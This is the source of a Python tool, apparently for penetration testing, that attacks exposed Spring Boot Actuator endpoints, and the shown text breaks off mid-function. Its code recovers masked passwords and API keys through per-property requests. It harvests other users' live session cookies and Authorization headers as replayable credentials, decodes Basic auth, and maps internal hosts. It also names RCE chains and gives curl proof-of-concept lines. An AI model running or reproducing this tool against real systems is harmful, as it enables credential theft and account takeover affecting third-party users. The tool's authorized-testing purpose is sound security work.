#!/usr/bin/env python3
"""
actuatorhunt.py - Spring Boot Actuator LOOT extractor.

This is not an endpoint finder. ffuf with a wordlist already tells you that
/actuator/env answers 200; that is not a finding, it is a URL. This tool exists
to answer the next question - "so what is actually in there?" - and it hands
back material you can use:

  /env, /configprops   every property, and the MASKED ones recovered.
                       Spring masks passwords as '******' in the index but
                       /env/{property} very often returns the real value. That
                       one extra request turns "env is exposed" into
                       "spring.datasource.password = Sup3rS3cret".

  /httpexchanges       other users' live Cookie and Authorization headers,
  /httptrace, /trace   pulled out as replayable credentials. Basic auth is
                       base64-decoded to user:pass on the spot.

  /jolokia             read-only JMX: java.lang:type=Runtime gives the full
                       JVM command line and system properties. Secrets passed
                       as -Dspring.datasource.password=... live there, and
                       reading them invokes nothing.

  /heapdump            streamed and mined for JWTs, session ids, JDBC URLs,
                       AWS keys and passwords, in a bounded sliding window so
                       a 2 GB dump never lands in RAM or on disk (--heapdump).

  /mappings, /metrics  the real internal attack surface: every route pattern
                       and every observed URI, written out as a list you can
                       feed straight into your other scanners.

Everything extracted is written under --loot as plain text, one directory per
host: credentials.txt, tokens.txt, urls.txt, routes.txt, env.json.

SAFETY - GET only. /shutdown, /refresh and /loggers are proven by the 405 a GET
returns on a POST-only endpoint and never invoked. Jolokia is read-only: the
Runtime MBean is read, no MBean is ever executed. The RCE chains (Gateway SpEL,
Jolokia JNDI gadgets, env+refresh property override) are flagged with the exact
chain, never fired.

Stdlib only. TLS verification disabled. For authorized testing only.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import concurrent.futures
import http.cookiejar
import json
import os
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

VERSION = "2.3.0"
MAX_BODY = 4 * 1024 * 1024
MAGIC_READ = 128
STREAM_CHUNK = 256 * 1024

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"
_SEV_ORDER = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, INFO: 4}

MGMT_PORTS = [8081, 9001, 9090, 8090, 8443, 9999, 8888, 9080]

BYPASS_SPELLINGS = [
    "{base}/;/{ep}", "{base}//{ep}", "{base}/./{ep}",
    "{base}/{ep};.json", "{base}/{ep}/", "{base}/%2e/{ep}",
]

QUICK = ["actuator", "actuator/health", "actuator/env", "health", "env"]

# Endpoints probed when no HAL index is available, ordered by loot value.
DEEP_FALLBACK = ["env", "configprops", "httpexchanges", "httptrace", "trace",
                 "jolokia", "gateway", "heapdump", "sessions", "mappings",
                 "metrics", "threaddump", "beans", "auditevents",
                 "scheduledtasks", "configserver", "loggers", "health",
                 "shutdown", "refresh"]

# Full enumeration list: Boot 1.x names, Boot 2/3 names and the common add-ons.
# (name, request path, severity, what it is worth)
ENDPOINT_CATALOG = [
    ("env",            "env",            HIGH, "configuration properties; masked secrets recoverable via /env/{property}"),
    ("configprops",    "configprops",    HIGH, "bound @ConfigurationProperties beans, same secrets under another shape"),
    ("heapdump",       "heapdump",       CRIT, "full JVM heap: passwords, tokens, sessions in memory"),
    ("jolokia",        "jolokia",        CRIT, "JMX over HTTP; JVM command line, and write gadgets lead to RCE"),
    ("httpexchanges",  "httpexchanges",  CRIT, "recent requests with other users' Authorization / Cookie headers"),
    ("httptrace",      "httptrace",      CRIT, "same buffer, Boot 2.0-2.1 name"),
    ("trace",          "trace",          CRIT, "same buffer, Boot 1.x name"),
    ("gateway",        "gateway/routes", CRIT, "Spring Cloud Gateway route table + the SpEL route API (CVE-2022-22947)"),
    ("sessions",       "sessions",       HIGH, "live session identifiers of logged-in users"),
    ("threaddump",     "threaddump",     MED,  "stack traces: internal class names, frameworks, sometimes arguments"),
    ("dump",           "dump",           MED,  "thread dump, Boot 1.x name"),
    ("mappings",       "mappings",       MED,  "the real routing table, including unlinked routes"),
    ("metrics",        "metrics",        MED,  "observed URIs under http.server.requests"),
    ("beans",          "beans",          LOW,  "Spring bean graph: frameworks and internal packages"),
    ("configserver",   "configserver",   HIGH, "Spring Cloud Config server: whole config repos, usually with secrets"),
    ("auditevents",    "auditevents",    MED,  "authentication events with usernames"),
    ("scheduledtasks", "scheduledtasks", LOW,  "cron expressions and job class names"),
    ("loggers",        "loggers",        HIGH, "logger levels; POST turns on DEBUG globally (log flooding / secret leak)"),
    ("logfile",        "logfile",        HIGH, "the application log file, served raw and Range-readable"),
    ("caches",         "caches",         LOW,  "cache names; DELETE evicts them"),
    ("conditions",     "conditions",     LOW,  "auto-configuration report, Boot 2/3"),
    ("autoconfig",     "autoconfig",     LOW,  "auto-configuration report, Boot 1.x"),
    ("info",           "info",           INFO, "build and git metadata (version, commit, branch)"),
    ("health",         "health",         INFO, "component health; details often name internal hosts"),
    ("flyway",         "flyway",         LOW,  "database migration history and schema names"),
    ("liquibase",      "liquibase",      LOW,  "database migration history and schema names"),
    ("quartz",         "quartz",         LOW,  "scheduled jobs and triggers"),
    ("integrationgraph", "integrationgraph", LOW, "Spring Integration flow graph"),
    ("startup",        "startup",        LOW,  "application startup steps and timings"),
    ("features",       "features",       INFO, "enabled feature toggles"),
    ("prometheus",     "prometheus",     LOW,  "raw metrics; URIs and internal labels"),
    ("hystrix.stream", "hystrix.stream", LOW,  "Hystrix circuit-breaker stream"),
    ("nacos",          "nacos",          MED,  "Nacos config bridge"),
    ("refresh",        "refresh",        HIGH, "POST-only; re-binds properties (the second half of the env override chain)"),
    ("restart",        "restart",        CRIT, "POST-only; restarts the context"),
    ("pause",          "pause",          HIGH, "POST-only; pauses the application"),
    ("resume",         "resume",         MED,  "POST-only; resumes the application"),
    ("shutdown",       "shutdown",       CRIT, "POST-only; shuts the application down"),
]
ENDPOINT_PATH = {n: p for n, p, _, _ in ENDPOINT_CATALOG}
ENDPOINT_SEV = {n: s for n, _, s, _ in ENDPOINT_CATALOG}
ENDPOINT_WHY = {n: w for n, _, _, w in ENDPOINT_CATALOG}


# ----------------------------------------------------------------------------
# What counts as loot
# ----------------------------------------------------------------------------

# Property names whose VALUE is a credential. Matched on the key.
CRED_KEY_RX = re.compile(
    r"(?i)(password|passwd|pwd|secret|credential|api[._-]?key|access[._-]?key|"
    r"private[._-]?key|token|auth|salt|keystore|truststore|signing|hmac|"
    r"client[._-]?secret|encrypt)")

# Property names that point at internal infrastructure. Value is a host/URL.
HOST_KEY_RX = re.compile(
    r"(?i)(url|uri|host|hosts|endpoint|address|server|servers|bootstrap|"
    r"zookeeper|eureka|consul|nodes|datasource|broker)")

# High-confidence secret shapes, matched on the VALUE (used on free text too:
# heap dumps, command lines, thread dumps).
VALUE_PATTERNS = [
    ("aws-access-key",  re.compile(r"\b(AKIA|ASIA)[0-9A-Z]{16}\b")),
    ("google-api-key",  re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b")),
    ("github-token",    re.compile(r"\bgh[pousr]_[0-9A-Za-z]{36,}\b")),
    ("slack-token",     re.compile(r"\bxox[baprs]-[0-9A-Za-z\-]{10,}\b")),
    ("jwt",             re.compile(r"\beyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}"
                                   r"\.[A-Za-z0-9_\-]{5,}")),
    ("jdbc-url",        re.compile(r"\bjdbc:[a-z0-9]+://[^\s\"'<>]{4,120}")),
    ("mongo-url",       re.compile(r"\bmongodb(?:\+srv)?://[^\s\"'<>]{4,120}")),
    ("amqp-url",        re.compile(r"\bamqps?://[^\s\"'<>]{4,120}")),
    ("redis-url",       re.compile(r"\brediss?://[^\s\"'<>]{4,120}")),
    ("private-key",     re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----")),
    ("basic-auth",      re.compile(r"\bBasic\s+[A-Za-z0-9+/]{16,}={0,2}")),
    ("bearer-token",    re.compile(r"\bBearer\s+[A-Za-z0-9._\-]{20,}")),
    ("session-id",      re.compile(r"\b(?:JSESSIONID|SESSION|PHPSESSID|"
                                   r"remember-me)=[A-Za-z0-9._\-%]{8,}")),
    ("url-with-creds",  re.compile(r"\b[a-z][a-z0-9+.\-]*://[^\s:/\"']{1,40}:"
                                   r"[^\s@\"']{1,40}@[^\s\"'<>]{3,80}")),
    # key=value pairs in free text: JVM command lines, heap dumps, thread
    # dumps. This is where `-Dspring.datasource.password=...` lives.
    ("keyed-secret",    re.compile(r"(?i)\b[A-Za-z0-9_.\-]*"
                                   r"(?:password|passwd|pwd|secret|"
                                   r"api[_.\-]?key|access[_.\-]?key|"
                                   r"auth[_.\-]?token|credential)"
                                   r"[A-Za-z0-9_.\-]*\s*[=:]\s*"
                                   r"[\"']?([^\s\"'<>,;&\x00-\x1f]{4,80})")),
]

# Values that are placeholders, not secrets: redaction, templates, empty-ish.
JUNK_VALUE_RX = re.compile(
    r"(?i)^(?:\*+|x+|null|none|true|false|changeme|\$\{.*|<.*>|%s|\{\{.*)$")


def clean_value(val):
    """Cut a match at the first control byte and trim. Heap dumps are binary."""
    out = []
    for ch in val:
        if ch < " " or ch == "\x7f":
            break
        out.append(ch)
    return "".join(out).strip().strip("\"'")

# Header names in an exchange whose value is a live credential.
CRED_HEADERS = ("authorization", "cookie", "set-cookie", "x-api-key",
                "x-auth-token", "x-csrf-token", "proxy-authorization",
                "x-amz-security-token", "authentication")

# Values Spring redacted. Their presence is the cue to go unmask them.
MASK_RX = re.compile(r"^\*{3,}$")

INTERNAL_HOST_RX = re.compile(
    r"(?i)\b(?:localhost|127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|"
    r"172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|[a-z0-9\-]+\.(?:internal|local|"
    r"intranet|corp|lan|svc|cluster\.local))\b")


def scan_value(text):
    """Return [(kind, value)] for every high-confidence secret shape in `text`."""
    out = []
    if not text:
        return out
    for kind, rx in VALUE_PATTERNS:
        for m in rx.finditer(text):
            val = clean_value(m.group(0))
            if not val:
                continue
            if kind == "keyed-secret":
                captured = clean_value(m.group(1) or "")
                if not captured or JUNK_VALUE_RX.match(captured):
                    continue
            if kind == "basic-auth":
                dec = decode_basic(val)
                if dec:
                    out.append(("basic-auth-decoded", dec))
            out.append((kind, val[:400]))
    return out


def decode_basic(header_value):
    """'Basic dXNlcjpwYXNz' -> 'user:pass'. This is the whole point of Basic."""
    try:
        blob = header_value.split(None, 1)[1]
        raw = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
        txt = raw.decode("utf-8", "replace")
        return txt if ":" in txt and txt.isprintable() else None
    except (IndexError, binascii.Error, ValueError):
        return None


# ----------------------------------------------------------------------------
# Colour / output
# ----------------------------------------------------------------------------

class Colors:
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; MAGENTA = "\033[95m"; CYAN = "\033[96m"
    GREY = "\033[90m"; BOLD = "\033[1m"; RESET = "\033[0m"
    _ATTRS = ("RED", "GREEN", "YELLOW", "BLUE", "MAGENTA", "CYAN", "GREY",
              "BOLD", "RESET")

    @classmethod
    def disable(cls):
        for a in cls._ATTRS:
            setattr(cls, a, "")


SEV_COLOR = {CRIT: "MAGENTA", HIGH: "RED", MED: "YELLOW", LOW: "CYAN",
             INFO: "GREY"}


def sev_paint(sev):
    return f"{getattr(Colors, SEV_COLOR[sev])}{Colors.BOLD}{sev}{Colors.RESET}"


class Status:
    """Wall-clock heartbeat from a daemon thread; whole lines, no redraw."""

    def __init__(self, reporter, total, interval=30.0, enabled=True):
        self.rep = reporter
        self.total = total
        self.interval = interval
        self.enabled = enabled
        self.done = 0
        self.loot = 0
        self._lk = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._t0 = 0.0

    def start(self):
        if not self.enabled:
            return
        self._t0 = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop.wait(self.interval):
            self.emit()

    def host_done(self, n=1):
        with self._lk:
            self.done += n

    def record_loot(self, n=1):
        with self._lk:
            self.loot += n

    def emit(self, label="status"):
        if not self.enabled:
            return
        with self._lk:
            done, loot = self.done, self.loot
        rem = max(0, self.total - done)
        el = int(time.time() - self._t0)
        C = Colors
        self.rep.line(f"{C.CYAN}[{label} {el // 60:02d}:{el % 60:02d}]  "
                      f"tested {done}/{self.total}  remaining {rem}  "
                      f"|  secrets extracted {loot}{C.RESET}")

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=1)


class Reporter:
    def __init__(self, level=0):
        self.level = level
        self.lock = threading.Lock()

    def _emit(self, text):
        with self.lock:
            sys.stdout.write(text + "\n")
            sys.stdout.flush()

    def line(self, text):
        self._emit(text)

    def finding(self, f: "Finding"):
        C = Colors
        lines = ["",
                 f"[{sev_paint(f.sev)}] {C.BOLD}{f.title}{C.RESET}",
                 f"  {C.CYAN}URL      :{C.RESET} {f.url}"]
        if f.impact:
            lines.append(f"  {C.CYAN}Impact   :{C.RESET} {f.impact}")
        if f.loot:
            lines.append(f"  {C.CYAN}Extracted:{C.RESET} "
                         f"{C.GREEN}{C.BOLD}{len(f.loot)} item(s){C.RESET}")
            for item in f.loot[:12]:
                lines.append(f"      {C.GREEN}{item}{C.RESET}")
            if len(f.loot) > 12:
                lines.append(f"      {C.GREY}... {len(f.loot) - 12} more, "
                             f"see the loot files{C.RESET}")
        if f.note:
            for ln in f.note.splitlines():
                lines.append(f"  {C.CYAN}Note     :{C.RESET} {ln}")
        if f.chain:
            lines.append(f"  {C.CYAN}Chain    :{C.RESET} {C.YELLOW}{f.chain}{C.RESET}")
        if f.poc:
            lines.append(f"  {C.CYAN}PoC      :{C.RESET} {C.YELLOW}{f.poc}{C.RESET}")
        self._emit("\n".join(lines))

    def test(self, msg):
        if self.level >= 1:
            self._emit(f"{Colors.GREY}[test]{Colors.RESET} {msg}")

    def info(self, msg):
        if self.level >= 1:
            self._emit(f"{Colors.BLUE}[info]{Colors.RESET} {msg}")

    def debug(self, msg):
        if self.level >= 2:
            self._emit(f"{Colors.MAGENTA}[dbg ]{Colors.RESET} {msg}")

    def warn(self, msg):
        if self.level >= 1:
            self._emit(f"{Colors.YELLOW}[warn]{Colors.RESET} {msg}")

    def error(self, msg):
        self._emit(f"{Colors.RED}[err ]{Colors.RESET} {msg}")

    def banner(self, msg):
        if self.level >= 1:
            self._emit(f"\n{Colors.BOLD}{Colors.BLUE}=== {msg} ==={Colors.RESET}")


# ----------------------------------------------------------------------------
# Model
# ----------------------------------------------------------------------------

@dataclass
class Finding:
    sev: str
    title: str
    url: str
    impact: str = ""
    loot: list = field(default_factory=list)
    note: str = ""
    chain: str = ""
    poc: str = ""


@dataclass
class Response:
    url: str
    status: int
    headers: dict
    body: str
    elapsed: float = 0.0
    error: str = ""

    @property
    def ok(self):
        return not self.error

    def header(self, name, default=""):
        for k, v in self.headers.items():
            if k.lower() == name.lower():
                return v
        return default


@dataclass
class Target:
    url: str


# ----------------------------------------------------------------------------
# HTTP
# ----------------------------------------------------------------------------

class Rate:
    def __init__(self, gap):
        self.gap = max(0.0, gap)
        self._next = 0.0
        self._lk = threading.Lock()

    def wait(self):
        if self.gap <= 0:
            return
        with self._lk:
            now = time.monotonic()
            w = max(0.0, self._next - now)
            self._next = max(now, self._next) + self.gap
        if w:
            time.sleep(w)


class Requester:
    def __init__(self, timeout=10.0, proxy=None, headers=None, delay=0.0,
                 reporter=None):
        self.timeout = timeout
        self.reporter = reporter
        self.proxy = proxy
        # identity: urllib does not gunzip, and a compressed body would defeat
        # both the JSON parsing and the heapdump mining
        self.base_headers = {"User-Agent": DEFAULT_UA, "Accept": "*/*",
                             "Accept-Encoding": "identity", "Connection": "close"}
        for h in headers or []:
            if ":" in h:
                k, _, v = h.partition(":")
                self.base_headers[k.strip()] = v.strip()
        self.rate = Rate(delay)
        self._local = threading.local()
        self._count_lock = threading.Lock()
        self.count = 0

    def _build_opener(self):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers = [urllib.request.HTTPSHandler(context=ctx),
                    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())]
        if self.proxy:
            handlers.append(urllib.request.ProxyHandler(
                {"http": self.proxy, "https": self.proxy}))
        return urllib.request.build_opener(*handlers)

    def _opener(self):
        op = getattr(self._local, "opener", None)
        if op is None:
            op = self._build_opener()
            self._local.opener = op
        return op

    def _req(self, url, extra_headers=None):
        headers = dict(self.base_headers)
        if extra_headers:
            headers.update(extra_headers)
        r = urllib.request.Request(url, method="GET")
        for k, v in headers.items():
            r.add_header(k, v)
        return r

    def get(self, url, extra_headers=None, max_read=MAX_BODY) -> Response:
        """GET only - this tool never mutates a target."""
        self.rate.wait()
        started = time.time()
        with self._count_lock:
            self.count += 1
        try:
            resp = self._opener().open(self._req(url, extra_headers),
                                       timeout=self.timeout)
            try:
                raw = resp.read(max_read)
                cs = resp.headers.get_content_charset() or "utf-8"
                out = Response(resp.geturl(), resp.status, dict(resp.headers),
                               raw.decode(cs, errors="replace"),
                               time.time() - started)
            finally:
                resp.close()
            return out
        except urllib.error.HTTPError as e:
            try:
                text = e.read(max_read).decode("utf-8", errors="replace")
            except Exception:
                text = ""
            return Response(url, e.code, dict(e.headers or {}), text,
                            time.time() - started)
        except Exception as e:
            if self.reporter:
                self.reporter.debug(f"request failed {url}: {e}")
            return Response(url, 0, {}, "", time.time() - started, error=str(e))

    def stream(self, url, max_bytes, on_chunk):
        """
        Stream a response through `on_chunk` without ever holding it whole.
        Used to mine a multi-gigabyte heapdump: nothing is written to disk and
        memory stays at one chunk plus a small overlap window.
        Returns (bytes_read, status) or (0, 0) on failure.
        """
        self.rate.wait()
        with self._count_lock:
            self.count += 1
        try:
            resp = self._opener().open(self._req(url), timeout=self.timeout)
        except urllib.error.HTTPError as e:
            return 0, e.code
        except Exception as e:
            if self.reporter:
                self.reporter.debug(f"stream failed {url}: {e}")
            return 0, 0
        read = 0
        try:
            while read < max_bytes:
                chunk = resp.read(min(STREAM_CHUNK, max_bytes - read))
                if not chunk:
                    break
                read += len(chunk)
                on_chunk(chunk)
        finally:
            resp.close()
        return read, resp.status


# ----------------------------------------------------------------------------
# Loot store
# ----------------------------------------------------------------------------

class Loot:
    """Per-host files holding everything extracted. This is the deliverable."""

    def __init__(self, root, rep: Reporter):
        self.root = root
        self.rep = rep
        self._lk = threading.Lock()
        self.counts = {}

    @staticmethod
    def _slug(url):
        p = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
        return re.sub(r"[^A-Za-z0-9._\-]", "_", p.netloc or url)[:120]

    def write(self, url, filename, lines):
        if not lines or not self.root:
            return ""
        d = os.path.join(self.root, self._slug(url))
        with self._lk:
            os.makedirs(d, exist_ok=True)
            path = os.path.join(d, filename)
            with open(path, "a", encoding="utf-8") as fh:
                for ln in lines:
                    fh.write(ln.rstrip("\n") + "\n")
            self.counts[filename] = self.counts.get(filename, 0) + len(lines)
        return path

    def write_raw(self, url, filename, text):
        if not text or not self.root:
            return ""
        d = os.path.join(self.root, self._slug(url))
        with self._lk:
            os.makedirs(d, exist_ok=True)
            path = os.path.join(d, filename)
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(text)
        return path


# ----------------------------------------------------------------------------
# /env parsing - both Boot 1.x and Boot 2/3 shapes
# ----------------------------------------------------------------------------

def iter_env_properties(obj):
    """
    Yield (source, key, value, masked) from an /env document.

    Boot 2/3: {"propertySources":[{"name":..,"properties":{k:{"value":v}}}]}
    Boot 1.x: {"<source name>": {k: v}, ...} - flat maps at the top level.
    """
    if not isinstance(obj, dict):
        return
    srcs = obj.get("propertySources")
    if isinstance(srcs, list):
        for src in srcs:
            if not isinstance(src, dict):
                continue
            name = str(src.get("name", "?"))
            props = src.get("properties") or {}
            if isinstance(props, dict):
                for k, meta in props.items():
                    val = meta.get("value") if isinstance(meta, dict) else meta
                    sval = "" if val is None else str(val)
                    yield name, str(k), sval, bool(MASK_RX.match(sval.strip()))
        return
    for name, props in obj.items():
        if isinstance(props, dict):
            for k, val in props.items():
                if isinstance(val, (dict, list)):
                    continue
                sval = "" if val is None else str(val)
                yield str(name), str(k), sval, bool(MASK_RX.match(sval.strip()))


def classify_property(key, value):
    """'credential' | 'host' | 'other', plus any secret shape inside the value."""
    shapes = scan_value(value)
    if CRED_KEY_RX.search(key) and value and not MASK_RX.match(value.strip()):
        return "credential", shapes
    if shapes:
        return "credential", shapes
    if HOST_KEY_RX.search(key) and re.search(r"[:/@.]", value or ""):
        return "host", shapes
    return "other", shapes


# ----------------------------------------------------------------------------
# Hunter
# ----------------------------------------------------------------------------

class ActuatorHunter:
    def __init__(self, req: Requester, rep: Reporter, args, loot: Loot,
                 status: Status = None):
        self.req = req
        self.rep = rep
        self.args = args
        self.loot = loot
        self.status = status
        self.findings: list[Finding] = []
        self.lock = threading.Lock()
        self.tested = 0
        self.secrets = 0

    def add(self, f: Finding):
        with self.lock:
            self.findings.append(f)
            self.secrets += len(f.loot)
        if self.status and f.loot:
            self.status.record_loot(len(f.loot))
        self.rep.finding(f)

    def bump(self):
        with self.lock:
            self.tested += 1

    def fetch(self, url, max_read=MAX_BODY) -> Response:
        r = self.req.get(url, max_read=max_read)
        self.bump()
        self.rep.debug(f"GET {url} -> "
                       f"{r.status if r.ok else 'err ' + r.error[:40]} "
                       f"{len(r.body)}b")
        return r

    def json_of(self, r: Response):
        if not r.ok or r.status != 200:
            return None
        body = (r.body or "").lstrip()
        if not (body.startswith("{") or body.startswith("[")):
            return None
        try:
            return json.loads(r.body)
        except Exception:
            return None

    # -- discovery -----------------------------------------------------------

    @staticmethod
    def _origin(url):
        p = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
        return f"{p.scheme}://{p.netloc}"

    def candidate_bases(self, url):
        p = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
        origin = f"{p.scheme}://{p.netloc}"
        bases = [f"{origin}/actuator"]
        segs = [s for s in p.path.split("/") if s]
        if segs:
            bases.append(f"{origin}/{segs[0]}/actuator")
        bases.append(origin)
        return list(dict.fromkeys(bases))

    def hal_index(self, base):
        r = self.fetch(base)
        obj = self.json_of(r)
        if not isinstance(obj, dict):
            return None
        links = obj.get("_links")
        if not isinstance(links, dict):
            return None
        names = [k for k in links if k != "self"]
        if names:
            self.rep.info(f"{base}: HAL index exposes {len(names)} endpoint(s)")
        return names

    def enumerate_endpoints(self, base, hal):
        """
        Probe every known endpoint and report what answers.

        The HAL index only lists what `management.endpoints.web.exposure`
        admits to; endpoints mounted under a non-default path, add-ons like
        jolokia or hystrix, and anything the index omits only show up here.
        Returns the list of endpoint names that exist, which is also what the
        harvesters are then run against.
        """
        hal_names = [n.split("/")[0] for n in (hal or [])]
        if self.args.depth == "fast":
            return list(dict.fromkeys(hal_names))

        names = list(dict.fromkeys(hal_names + [n for n, _, _, _ in ENDPOINT_CATALOG]))
        alive, rows, sizes = [], [], {}
        for name in names:
            path = ENDPOINT_PATH.get(name, name)
            r = self.fetch(f"{base}/{path}",
                           max_read=MAGIC_READ if name == "heapdump" else MAX_BODY)
            if not r.ok:
                continue
            ctype = r.header("Content-Type", "").lower()
            if r.status in (200, 206):
                body = (r.body or "").lstrip()
                is_json = self.json_of(r) is not None
                binary = "octet-stream" in ctype or "JAVA PROFILE" in body[:64]
                texty = ("html" not in ctype and not body.startswith("<")
                         and bool(body))
                if not (is_json or binary or texty):
                    continue
                sizes.setdefault(len(r.body or ""), []).append(name)
                state = "200"
            elif r.status in (401, 403):
                state = f"{r.status} (present but guarded)"
            elif r.status == 405:
                state = "405 (mounted, POST-only)"
            else:
                continue
            alive.append(name)
            rows.append((ENDPOINT_SEV.get(name, INFO), name, path, state,
                         len(r.body or "")))

        # a catch-all handler answers everything with the same page: drop it
        for size, group in sizes.items():
            if len(group) >= 8:
                self.rep.info(f"{base}: catch-all handler suspected "
                              f"({len(group)} endpoints, identical {size}b) - "
                              f"discarding those")
                alive = [n for n in alive if n not in group]
                rows = [r for r in rows if r[1] not in group]

        if not rows:
            return list(dict.fromkeys(hal_names))

        rows.sort(key=lambda x: (_SEV_ORDER.get(x[0], 9), x[1]))
        lines = [f"[{sev}] /{path}  -> {state}   {ENDPOINT_WHY.get(name, '')}"
                 for sev, name, path, state, _ in rows]
        self.loot.write(base, "endpoints.txt", [f"# {base}"] + lines)
        worst = rows[0][0]
        self.add(Finding(
            sev=worst if _SEV_ORDER[worst] <= _SEV_ORDER[MED] else INFO,
            title=f"{len(rows)} actuator endpoint(s) reachable",
            url=base,
            impact="Full endpoint inventory for this instance, including "
                   "endpoints the HAL index does not advertise.",
            loot=lines,
            note=("from the HAL index plus a full probe"
                  if hal else "no HAL index; probed directly")))
        return list(dict.fromkeys(alive + hal_names))

    def quick_hit(self, url):
        origin = self._origin(url)
        for probe in QUICK:
            r = self.fetch(f"{origin}/{probe}")
            if not r.ok:
                continue
            if r.status in (401, 403, 405):
                return True
            if r.status == 200 and self.json_of(r) is not None:
                return True
        return False

    # -- harvesters ----------------------------------------------------------

    def harvest_env(self, base, endpoint="env"):
        """
        Pull every property, then go back for the masked ones.

        This is the difference between an endpoint list and a finding: the index
        shows spring.datasource.password = '******', but /env/{property}
        resolves a single property and very often returns it in clear.
        """
        url = f"{base}/{endpoint}"
        r = self.fetch(url)
        obj = self.json_of(r)
        if obj is None:
            return
        props = list(iter_env_properties(obj))
        if not props:
            return

        creds, hosts, masked = [], [], []
        for src, key, val, is_masked in props:
            if is_masked:
                masked.append((src, key))
                continue
            kind, shapes = classify_property(key, val)
            if kind == "credential":
                creds.append(f"{key} = {val[:200]}")
                for sk, sv in shapes:
                    if sv[:200] != val[:200]:
                        creds.append(f"  ^ {sk}: {sv[:200]}")
            elif kind == "host":
                hosts.append(f"{key} = {val[:200]}")

        # recover the redacted values, one request each, budget-capped
        recovered = []
        if masked and not self.args.no_unmask:
            budget = self.args.unmask_max
            for src, key in masked:
                if budget <= 0:
                    break
                if not CRED_KEY_RX.search(key):
                    continue
                budget -= 1
                rr = self.fetch(f"{base}/{endpoint}/"
                                f"{urllib.parse.quote(key, safe='')}")
                oo = self.json_of(rr)
                clear = None
                if isinstance(oo, dict):
                    prop = oo.get("property")
                    if isinstance(prop, dict):
                        v = prop.get("value")
                        if v is not None and not MASK_RX.match(str(v).strip()):
                            clear = str(v)
                    if clear is None:
                        for _s, k2, v2, m2 in iter_env_properties(oo):
                            if k2 == key and not m2 and v2:
                                clear = v2
                                break
                if clear:
                    recovered.append(f"{key} = {clear[:200]}   "
                                     f"[recovered - masked in the index]")

        all_creds = creds + recovered
        if all_creds:
            p1 = self.loot.write(base, "credentials.txt",
                                 [f"# {url}"] + all_creds)
            self.add(Finding(
                sev=CRIT,
                title=f"Credentials extracted from /{endpoint}"
                      + (f" ({len(recovered)} recovered from masked values)"
                         if recovered else ""),
                url=url,
                impact="These are usable secrets, not an exposed endpoint: "
                       "datasource passwords, API keys and signing material "
                       "read straight out of the running configuration.",
                loot=all_creds,
                note=(f"{len(masked)} value(s) were masked in the index; "
                      f"{len(recovered)} recovered via /{endpoint}/{{property}}"
                      if masked else ""),
                poc=f"curl -sk '{url}/spring.datasource.password'"
                    if recovered else f"curl -sk '{url}'"))
        if hosts:
            internal = [h for h in hosts if INTERNAL_HOST_RX.search(h)]
            self.loot.write(base, "urls.txt", [f"# {url}"] + hosts)
            if internal:
                self.add(Finding(
                    sev=HIGH,
                    title=f"Internal infrastructure mapped from /{endpoint}",
                    url=url,
                    impact="Internal hosts and service URLs - direct SSRF "
                           "targets and a map of the private network.",
                    loot=internal,
                    poc=f"curl -sk '{url}'"))

        # full document for offline review
        self.loot.write_raw(base, f"{endpoint}.json", r.body)

        # the property-override chain is only real if /refresh is mounted
        if endpoint == "env":
            self._env_refresh_chain(base, url)

    def _env_refresh_chain(self, base, env_url):
        r = self.fetch(f"{base}/refresh")
        if r.ok and r.status == 405:
            self.add(Finding(
                sev=CRIT,
                title="Runtime property override chain available (/env + /refresh)",
                url=env_url,
                impact="/refresh is mounted and /env is readable. A POST to "
                       "/env sets an arbitrary property and /refresh applies "
                       "it, which reconfigures the running application.",
                chain="POST /actuator/env {name,value} -> POST /actuator/refresh "
                      "(NOT attempted by this tool - confirm in scope)",
                note="proven by the 405 a GET returns on the POST-only /refresh"))

    def harvest_exchanges(self, base, endpoint):
        """Pull other users' live credentials out of the request trace buffer."""
        url = f"{base}/{endpoint}"
        r = self.fetch(url)
        obj = self.json_of(r)
        if obj is None:
            return
        items = []
        if isinstance(obj, dict):
            items = obj.get("exchanges") or obj.get("traces") or []
        elif isinstance(obj, list):
            items = obj
        if not items:
            return

        creds, seen = [], set()
        for ex in items:
            if not isinstance(ex, dict):
                continue
            req = ex.get("request") or {}
            uri = req.get("uri") or req.get("url") or ""
            headers = req.get("headers") or {}
            if isinstance(headers, dict):
                for hname, hval in headers.items():
                    if hname.lower() not in CRED_HEADERS:
                        continue
                    vals = hval if isinstance(hval, list) else [hval]
                    for v in vals:
                        v = str(v)
                        key = (hname.lower(), v)
                        if key in seen:
                            continue
                        seen.add(key)
                        line = f"{hname}: {v[:300]}   <- {uri[:80]}"
                        creds.append(line)
                        dec = decode_basic(v) if v.lower().startswith("basic ") else None
                        if dec:
                            creds.append(f"  ^ decoded: {dec}")
        if not creds:
            return
        self.loot.write(base, "tokens.txt", [f"# {url}"] + creds)
        self.add(Finding(
            sev=CRIT,
            title=f"Live credentials harvested from /{endpoint}",
            url=url,
            impact="These Cookie / Authorization values belong to OTHER users "
                   "and were captured by the application itself. They are "
                   "replayable as-is: this is account takeover, not disclosure.",
            loot=creds,
